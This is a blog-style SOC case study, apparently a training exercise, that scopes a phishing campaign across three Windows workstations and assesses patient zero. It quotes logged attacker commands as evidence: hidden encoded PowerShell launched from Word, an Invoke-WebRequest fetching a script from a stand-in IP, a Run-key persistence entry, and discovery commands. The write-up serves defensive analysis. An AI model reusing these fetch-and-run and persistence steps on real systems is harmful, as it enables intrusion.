---

layout: post
title: "SOC Investigation Case Study — Incident Scoping and Patient Zero"
date: 2026-08-21
categories: [SOC, "Incident Response", Phishing, "Threat Detection"]
tags: [phishing, incident-scoping, patient-zero, lateral-movement, PowerShell, Sysmon, Windows, SOC]
----------------------------------------------------------------------------------------------------

# 🧪 SOC Case #005 — Incident Scoping & Patient Zero

## Overview

This investigation focused on a different SOC question:

> **How far did the attack spread?**

Rather than analyzing one suspicious event in isolation, the objective was to correlate email, endpoint, network, authentication and file-share telemetry across multiple workstations.

The investigation involved three hosts:

* `WS-FIN-007` — Alice Okafor, Finance
* `WS-HR-012` — David Bello, HR
* `WS-OPS-031` — James Eze, Operations

The investigation ultimately identified **two affected hosts belonging to the same phishing campaign**, while Host C remained unconfirmed for compromise.

---

# 1. Initial Alert

At **14:05 UTC**, the SOC received an alert for suspicious PowerShell activity involving a Finance employee.

Initial investigation focused on `WS-FIN-007`.

The available telemetry showed a phishing email, malicious Word document execution, PowerShell activity, payload download, registry persistence, discovery commands and subsequent authentication activity involving another workstation.

---

# 2. Initial Access — Phishing Email

Alice received:

```text
From: accounts@vendor-invoice-support.com
To: alice.okafor@company.com
Subject: Urgent: Updated Supplier Invoice
Attachment: Supplier_Invoice_8821.docm
```

The sending domain had been registered only **6 days earlier**.

The same attachment and sender were subsequently observed targeting an HR employee.

This immediately suggested that the activity could represent a broader phishing campaign rather than an isolated event.

---

# 3. Host A — WS-FIN-007

## Malicious Document Execution

At **08:47:31**, Sysmon Event ID 1 recorded:

```text
Image:
powershell.exe

ParentImage:
WINWORD.EXE

CommandLine:
powershell.exe -nop -w hidden -enc <Base64>
```

The parent-child relationship is significant.

```text
WINWORD.EXE
     ↓
powershell.exe
     ↓
Encoded command
```

PowerShell executing from Microsoft Word in hidden mode with an encoded command is a strong indicator of malicious document execution.

---

# 4. Payload Download

One second later, PowerShell Script Block Logging recorded:

```text
Invoke-WebRequest https://203.0.113.45/update.ps1
```

Sysmon Event ID 3 then recorded:

```text
Image:
powershell.exe

Destination:
203.0.113.45:443
```

This establishes a clear relationship between the malicious PowerShell process and the external payload infrastructure.

---

# 5. Payload Creation

At **08:47:36**, Sysmon Event ID 11 recorded:

```text
C:\Users\alice\AppData\Roaming\Microsoft\update.ps1
```

The downloaded PowerShell payload was therefore written to the workstation.

The investigation had now progressed from:

```text
Phishing
    ↓
Execution
    ↓
External payload retrieval
    ↓
Payload creation
```

---

# 6. Persistence

At **08:48:02**, Sysmon Event ID 13 recorded a registry modification:

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OfficeUpdate

C:\Users\alice\AppData\Roaming\Microsoft\update.exe
```

This establishes a persistence mechanism using the Windows Registry Run Key.

The attacker therefore attempted to maintain execution across user logons.

---

# 7. Discovery Activity

Later telemetry showed:

```text
08:57:02

update.exe
    ↓
cmd.exe /c whoami
```

followed by:

```text
08:57:04

update.exe
    ↓
cmd.exe /c net user
```

These commands represent discovery activity.

The attack had therefore progressed beyond initial execution and persistence into host/account enumeration.

---

# 8. Host B — WS-HR-012

The same phishing campaign was observed against David Bello.

### Email

```text
From: accounts@vendor-invoice-support.com
To: david.bello@company.com
Subject: Urgent: Updated Supplier Invoice
Attachment: Supplier_Invoice_8821.docm
```

The same sender and attachment were involved.

At **08:50:11**, Sysmon recorded:

```text
WINWORD.EXE
Parent: explorer.exe

Supplier_Invoice_8821.docm
```

Four seconds later:

```text
powershell.exe
ParentImage:
WINWORD.EXE
```

The PowerShell command used the same encoded execution pattern.

---

# 9. Same Payload Infrastructure

Host B subsequently communicated with:

```text
203.0.113.45:443
```

and created:

```text
C:\Users\david\AppData\Roaming\Microsoft\update.ps1
```

This was highly significant.

Both hosts independently showed:

```text
Same phishing attachment
        ↓
PowerShell execution
        ↓
Same external infrastructure
        ↓
Same payload filename/path
```

This provided strong evidence that the two hosts were part of the same campaign.

---

# 10. DNS Correlation

DNS telemetry further connected the hosts.

### WS-FIN-007

```text
08:47:33

vendor-invoice-support.com
```

### WS-HR-012

```text
08:50:15

vendor-invoice-support.com
```

The same suspicious domain was therefore resolved by both affected workstations.

---

# 11. Authentication Correlation

The investigation then revealed activity that suggested possible lateral movement.

At **08:55:21**:

```text
User: alice.okafor
Source: WS-FIN-007
Destination: DC01
Logon Type: 3
Status: Success
```

At **08:56:04**:

```text
User: alice.okafor
Source: WS-FIN-007
Destination: WS-HR-012
Logon Type: 3
Status: Success
```

At **08:56:17**:

```text
User: david.bello
Source: WS-HR-012
Destination: WS-FIN-007
Logon Type: 3
Status: Success
```

This sequence raised the hypothesis of credential or authenticated-session abuse between the two workstations.

---

# 12. File Share Activity

At **08:56:20**, file-share telemetry showed:

```text
Source:
WS-FIN-007

Account:
alice.okafor

Accessed:
\\WS-HR-012\C$\Users\david\AppData\Roaming\Microsoft\
```

This provided additional evidence that the activity was not limited to phishing delivery.

A compromised workstation associated with Alice's account was accessing a sensitive administrative file-share path on David's workstation.

This required immediate investigation for possible lateral movement and credential abuse.

---

# 13. Is Host C Compromised?

Host C was intentionally included as a potential false positive.

`WS-OPS-031` showed:

```text
EXCEL.EXE
    ↓
PowerShell
    ↓
Get-Service
```

and:

```text
PowerShell
    ↓
10.0.0.15:443
```

It also contained:

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\TeamsStartup
```

However, Host C did **not** show the strongest campaign indicators:

* No phishing attachment
* No connection to `203.0.113.45`
* No `vendor-invoice-support.com`
* No `update.ps1`
* No relationship to the malicious Word document
* No malicious PowerShell parented by Word

Therefore:

> **Host C was not classified as compromised based on the available evidence.**

However, it should remain under investigation because the PowerShell activity, network connection and Run Key modification require validation.

---

# 14. Patient Zero Assessment

The likely patient-zero host is:

```text
WS-FIN-007
Alice Okafor
```

The reason is not simply that Alice received the phishing email first.

The available telemetry shows the earliest confirmed malicious endpoint execution on WS-FIN-007:

```text
08:47:31
WINWORD.EXE
      ↓
PowerShell
```

This was followed by payload retrieval, persistence and discovery activity.

However, the evidence does **not** establish who first received or clicked the phishing email.

Therefore:

> **WS-FIN-007 is the likely patient-zero host based on the earliest observed malicious activity, but patient zero is not conclusively established.**

---

# 15. Incident Scope

Based on the available telemetry:

| Host       | Assessment                 | Key Evidence                                                                |
| ---------- | -------------------------- | --------------------------------------------------------------------------- |
| WS-FIN-007 | 🔴 Compromised             | Malicious PowerShell, payload, persistence, execution, discovery            |
| WS-HR-012  | 🔴 Compromised             | Same phishing attachment, PowerShell, payload download, same infrastructure |
| WS-OPS-031 | 🟡 Not currently confirmed | No campaign indicators; activity requires validation                        |

### Current scope

**2 affected workstations**

**2 associated user accounts requiring containment/investigation**

The scope should not be considered final until enterprise-wide IOC searches are completed.

---

# 16. Incident Verdict

### Classification

**Successful phishing campaign with multi-host compromise and suspected lateral movement.**

### Severity

**HIGH**

### Primary attack vector

**Phishing email with a malicious macro-enabled Word document.**

### Confirmed activity

* Malicious document execution
* PowerShell execution
* Payload download
* Payload creation
* Registry persistence on WS-FIN-007
* Discovery activity
* Cross-host authentication
* Administrative file-share access

---

# 17. Immediate Containment Priorities

Given limited SOC resources, containment should focus on stopping further execution and lateral movement.

### Priority 1 — Isolate affected hosts

Immediately isolate:

```text
WS-FIN-007
WS-HR-012
```

This prevents continued communication and potential lateral movement.

### Priority 2 — Contain associated accounts

Restrict or temporarily disable the accounts where operationally appropriate, beginning with Alice's account due to the stronger compromise evidence.

### Priority 3 — Revoke sessions and reset credentials

Revoke active sessions/tokens and force password resets.

Treat credentials associated with the affected hosts as potentially compromised until identity investigation is complete.

### Priority 4 — Block campaign infrastructure

Block or quarantine:

```text
vendor-invoice-support.com
203.0.113.45
```

after validating the appropriate network-control scope.

### Priority 5 — Search enterprise telemetry

Search across:

* Email gateway
* DNS
* Proxy
* EDR
* Windows Event Logs
* Sysmon
* Authentication logs
* File-share telemetry

for:

```text
Supplier_Invoice_8821.docm
vendor-invoice-support.com
203.0.113.45
update.ps1
update.exe
OfficeUpdate
```

The objective is to identify additional victims and determine whether WS-FIN-007 and WS-HR-012 represent the full scope.

---

# 18. MITRE ATT&CK Mapping

| Technique                                          | Evidence                                                        |
| -------------------------------------------------- | --------------------------------------------------------------- |
| **T1566.001 — Phishing: Spearphishing Attachment** | Malicious `.docm` attachment delivered through email            |
| **T1059.001 — PowerShell**                         | PowerShell executed from WINWORD.EXE                            |
| **T1105 — Ingress Tool Transfer**                  | `Invoke-WebRequest` retrieved `update.ps1`                      |
| **T1547.001 — Registry Run Keys / Startup Folder** | `OfficeUpdate` Run Key persistence                              |
| **T1087 — Account Discovery**                      | `net user`                                                      |
| **T1033 — System Owner/User Discovery**            | `whoami`                                                        |
| **T1021 — Remote Services**                        | Cross-host authentication activity requiring further validation |

---

# 19. Key SOC Lessons

This investigation reinforced several important SOC principles.

### 1. One malicious event does not define the incident

The important finding was not simply that PowerShell executed.

The investigation became significant when multiple telemetry sources connected the activity across hosts.

### 2. Campaign indicators are powerful correlation points

The same:

```text
Sender
Attachment
Domain
IP
Payload
Execution pattern
```

appeared across multiple hosts.

This allowed the SOC to move from **single-host detection** to **incident scoping**.

### 3. Patient zero requires evidence

The earliest email recipient is not automatically patient zero.

The safest conclusion was:

> **WS-FIN-007 is the likely patient-zero host based on earliest observed malicious execution, but this is not conclusively established.**

### 4. Not every suspicious host is compromised

Host C contained activity worth investigating, but there was insufficient evidence to connect it to the phishing campaign.

This prevents unnecessary containment and keeps the investigation evidence-driven.

### 5. Authentication telemetry can reveal lateral movement

The cross-host Logon Type 3 events and administrative file-share access significantly changed the scope of the investigation.

The SOC must therefore correlate:

```text
Email
 ↓
Endpoint
 ↓
Network
 ↓
Authentication
 ↓
File Access
```

rather than investigating each telemetry source independently.

---

# Conclusion

This case demonstrated the difference between **alert triage** and **incident scoping**.

The initial alert identified suspicious PowerShell activity on a Finance workstation. Correlation with email, DNS, Sysmon, authentication and file-share telemetry revealed that the activity was part of a broader phishing campaign affecting both Finance and HR.

`WS-FIN-007` showed the most advanced compromise, including persistence and discovery activity, while `WS-HR-012` showed the same malicious execution and payload activity.

`WS-OPS-031` was not classified as compromised because the available evidence did not connect it to the campaign.

The final assessment was therefore:

> **High-severity, multi-host phishing compromise involving WS-FIN-007 and WS-HR-012, with suspected lateral movement and an unresolved patient-zero determination.**

---
